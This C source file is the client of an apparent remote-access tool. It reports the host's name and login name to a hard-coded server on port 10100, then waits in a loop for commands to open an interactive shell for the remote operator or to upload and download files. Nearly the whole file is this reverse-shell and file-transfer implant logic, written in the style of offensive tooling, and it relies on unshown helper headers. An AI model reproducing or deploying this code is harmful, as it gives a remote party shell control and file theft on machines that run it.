#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pwd.h>
#include <errno.h>
#include <string.h>

#include "xshell.h"
#include "xfragment.h"
#include "xfile.h"
#include "xrequest.h"

#define SERVER_IP (char *)"127.0.0.1"
#define SERVER_PORT 10100

xtcpsocket_t client_socket;

int exec_shell()
{
    if (xshell_start(&client_socket, RESPONDER) == -1)
    {
        fprintf(stderr,
                "[!] xshell_start() failed\n\r");
        return -1;
    }

    printf("[+] xshell started successfully!\n");

    if (xshell_wait() == -1)
    {
        fprintf(stderr,
                "[!] xshell_wait() failed\n\r");
        return -1;
    }

    printf("[+] xshell session waite finished!\n");

    if (xshell_finish() == -1)
    {
        fprintf(stderr,
                "[!] xshell_finish() failed\n\r");
        return -1;
    }
    printf("[+] xshell finished succesffuly finished!\n");
    return 0;
}
int exec_file_sharing()
{
    xfile_t file;
    int mode;
    if (make_fhandshake_d(&client_socket, &file, &mode) == -1)
    {
        fprintf(stderr,
                "[!] failed to make handshake!\r\n");
        return -1;
    }
    switch (mode)
    {
    case XFMODE_DOWNLOAD:
        printf("[+] DOWNLOAD command detected!\n");
        if (xfile_send(&client_socket, &file) == -1)
        {
            fprintf(stderr,
                    "[!] xfile_send() failed\n\r");
            return -1;
        }
        break;

    case XFMODE_UPLOAD:
        printf("[+] UPLOAD command detected!\n");
        if (xfile_recv(&client_socket, &file) == -1)
        {
            fprintf(stderr,
                    "[!] xfile_recv() failed\n\r");
            return -1;
        }
        break;
    default:
        fprintf(stderr,
                "[!] invalid mode\n\r");
        return -1;
        break;
    }
    printf("[+] operation was finished successfully!\n");
    return 0;
}
int get_username_logname(char *_username, size_t _user_name_len, char *_logname, size_t _logname_len)
{
    if (gethostname(_username, _user_name_len))
    {
        perror("[!] get_username_logname():gethostname() failed");
        snprintf(_username, _user_name_len, "null");
        return -1;
    }
    if (getlogin_r(_logname, _logname_len))
    {
        perror("[!] get_username_logname():getlogin_r() failed");
        // If getlogin_r() fails, try alternative methods
        struct passwd *pw = getpwuid(getuid());
        if (pw != NULL)
        {
            snprintf(_logname, _logname_len, "%s", pw->pw_name);
        }
        else
        {
            // If all attempts fail, set a default username
            snprintf(_logname, _logname_len, "null");
            fprintf(stderr, "Failed to retrieve login name: %s\n", strerror(errno));
        }
    }
    return 0;
}
int main()
{
    xrequest_t req;
    req.xr_flag = XRFLAG_INIT;
    if (get_username_logname(req.xr_hostname, XR_HOSTNAME_LEN,
                             req.xr_logname, XR_LOGNAME_LEN) == -1)
    {
        fprintf(stderr,
                "[!] get_username_logname() failed\n\r");
        exit(EXIT_FAILURE);
    }
    if (xtcpsocket_create(&client_socket, AF_INET, xst_client) == -1)
    {
        fprintf(stderr,
                "[!] xtcpsocket_create() failed\n\r");
        exit(EXIT_FAILURE);
    }
    if (xtcpsocket_connect(&client_socket, SERVER_IP, SERVER_PORT) == -1)
    {
        fprintf(stderr,
                "[!] xtcpsocket_create() failed\n\r");
        exit(EXIT_FAILURE);
    }
    printf("[+] connected successfully to server!\n");

    xtcpsocket_init_communication(&client_socket);

    do
    {
        xrequest_send(&client_socket, &req);
        xrequest_recv(&client_socket, &req);
    } while (req.xr_flag != XRFlAG_ACK_INIT);

    while (1)
    {
        xrequest_recv(&client_socket, &req);
        switch (req.xr_flag)
        {
        case XRFLAG_SHELL:
            exec_shell();
            break;
        case XRFLAG_FILE_SHARING:
            exec_file_sharing();
            break;
        default:
            fprintf(stderr,
                    "invalid flag from xrequest\r\n");
            break;
        }
    }

    xtcpsocket_close(&client_socket);
    getchar();
}
